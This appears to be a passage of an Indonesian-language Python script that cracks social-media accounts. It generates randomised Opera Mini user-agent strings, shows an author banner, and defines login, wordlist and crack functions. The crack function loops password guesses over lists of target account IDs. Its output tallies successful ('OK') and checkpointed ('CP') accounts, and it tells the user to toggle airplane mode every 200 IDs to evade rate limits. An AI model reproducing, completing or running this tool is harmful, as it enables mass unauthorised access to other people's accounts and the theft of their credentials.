...
for manu in range(1000):
	...
	ditz1 = f"Opera/9.80 ({rams}; Opera Mini/{str(rr(1,10))}.{str(rr(1,10))}.{str(rr(3999,50000))}/{str(rr(75,150))}.{str(rr(75,150))}; U; {merk}) Presto/2.12.423 Version/12.16"
	ditz2 = f"SAMSUNG-GT-E1282T Opera/9.80 ({rams}; Opera Mini/{str(rr(1,10))}.{str(rr(1,10))}.{str(rr(3999,50000))}/{str(rr(75,150))}.{str(rr(75,150))}; U; {merk}) Presto/2.12.423 Version/{str(rr(8,20))}.{str(rr(8,20))}"
	Genjutsu = str(rc([ua_K,ua_samsung,ua_campur,ditz1,ditz2]))
...
██║ ╚═╝ ██║██║  ██║███████╗██║██║ ╚████║╚██████╔╝    ██║     ██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝     ╚═════╝     
\t   {P} >>> {m}•{k}•{h}•{x} AUTHOR : SABUN MANDI {m}•{k}•{h}•{x} <<<                                          ''''') 
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Menggeser Matahari☀️ {m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'├──>   Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'├──>   Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print(f'├──>   Mainkan Mode Pesawat ✈️ Setiap {m}200{x} Idz\n')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rSABUN {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = rc(ugen)
	ses = requests.Session()
	for pw in pwv:
